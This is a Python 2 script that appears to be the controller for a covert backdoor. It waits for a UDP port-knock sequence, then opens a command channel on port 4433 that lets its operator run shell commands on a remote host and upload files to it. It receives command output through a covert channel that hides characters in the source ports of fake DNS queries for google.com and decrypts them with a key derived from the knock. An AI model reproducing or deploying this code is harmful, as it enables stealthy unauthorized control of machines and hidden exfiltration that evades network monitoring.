#!/usr/bin/python
# import python modules
from socket import *
import os.path
import knocker
from scapy.all import *
from dcutils import decrypt

EOL = 'Z'
EOF = 'G'
RECEIVING = 0
CONTENT = ""

def upload(conn,command,filepath):
    if os.path.isfile(filepath):
        filesize = str(os.path.getsize(filepath))
        command = command + " " + filesize
        conn.send(command)
        with open(filepath, "rb") as f:
            bytes_read = f.read(1024)
            while bytes_read:
                conn.send(bytes_read)
                bytes_read = f.read(1024)
    else:
        print "Invalid Usage of \"upload\", update filename"


def accept_commands(conn):
    # receive initial connection
    data = conn.recv(1024)
    # start loop
    while 1:
        # enter shell command
        global RECEIVING
        if RECEIVING == 0:
            command = raw_input("Enter shell command or quit: ")
            cmdArgs = command.split(' ')
            # if we specify quit then break out of loop and close socket
            if cmdArgs[0] == "quit":
                conn.send(command)
                break
            if cmdArgs[0] == "upload":
                upload(conn,command,cmdArgs[1])
            else:
                conn.send(command)
                RECEIVING = 1
                global CONTENT
                CONTENT = ""
                sniff(filter="udp", prn=parse)
                # receive output from linux command
                #data = conn.recv(1024)
                # print the output of the linux command
                #print data



def listen():
    HOST = ''  # '' means bind to all interfaces
    PORT = 4433  # port
    # create our socket handler
    s = socket.socket(AF_INET, SOCK_STREAM)
    # set is so that when we cancel out we can reuse port
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    # bind to interface
    s.bind((HOST, PORT))
    # print we are accepting connections
    print "Looking for snake bites on port %s" % str(PORT)
    # listen for only 10 connection
    s.listen(10)
    # accept connections
    conn, addr = s.accept()
    # print connected by ipaddress
    print 'Connected by', addr[0]
    if addr[0] == knocker.SOURCE_IP:
        accept_commands(conn)
    print "closing connection"
    conn.close()
    s.close()

def parse_by_character(char):
    global CONTENT
    if char == EOF:
        print "received data: "+ CONTENT
        decrypted = decrypt(CONTENT , knocker.PASS)
        print decrypted
        global RECEIVING
        RECEIVING = 0
    #elif char == EOL:
    #    sys.stdout.write("\n")
    #    sys.stdout.flush()
    else:
        CONTENT += char

def parse(pkt):
    global RECEIVING
    if pkt.haslayer(UDP) and pkt['UDP'].dport == knocker.PORT_KNOCKER[knocker.PORT_KNOCKER_INDEX]:
        knocker.port_knock(pkt)
        if len(knocker.PASS) == len(knocker.PORT_KNOCKER)*2:
            print knocker.PASS
            listen()
    elif  pkt.haslayer(DNS) and pkt['DNS'].qd[DNSQR].qname == "google.com." and RECEIVING:
        srcPort = hex(pkt['UDP'].sport)
        if pkt['UDP'].sport > 4095:
            parse_by_character(chr(int(srcPort[2:4],16)))
            parse_by_character(chr(int(srcPort[4:], 16)))
        else:
            parse_by_character(chr(int(srcPort[2],16)))
            parse_by_character(chr(int(srcPort[3:], 16)))

def main():
    sniff(filter="udp", prn=parse)

if __name__ == '__main__':
    main()
